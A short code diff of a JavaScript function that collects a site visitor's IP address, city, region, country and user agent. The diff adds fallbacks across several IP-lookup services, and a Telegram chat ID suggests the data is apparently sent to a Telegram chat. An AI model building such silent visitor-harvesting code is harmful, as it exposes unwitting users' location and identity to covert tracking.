@@ -4,13 +4,27 @@ const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 async function getBrowserData() {
   let ipInfo = 'IP: Unknown, Location: Unknown';
   try {
-    const response = await fetch('https://ipwho.is/');
+    // Try primary robust service
+    const response = await fetch('http://ip-api.com/json/');
     const data = await response.json();
-    if (data.success) {
-      ipInfo = `IP: ${data.ip}, Location: ${data.city}, ${data.region}, ${data.country}`;
+    if (data.status === 'success') {
+      ipInfo = `IP: ${data.query}, Location: ${data.city}, ${data.regionName}, ${data.country}`;
+    } else {
+      // Fallback to ipify for just IP if location service fails
+      const ipOnlyResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipOnlyResponse.json();
+      ipInfo = `IP: ${ipData.ip}, Location: (Location fetch failed)`;
     }
   } catch (error) {
     console.error('Failed to fetch IP info:', error);
+    try {
+      // Last resort fallback
+      const lastResort = await fetch('https://api.ipify.org?format=json');
+      const lastResortData = await lastResort.json();
+      ipInfo = `IP: ${lastResortData.ip}, Location: Unknown (CORS/Network error)`;
+    } catch (e) {
+      ipInfo = 'IP: Network Error, Location: Network Error';
+    }
   }
 
   const userAgent = navigator.userAgent;
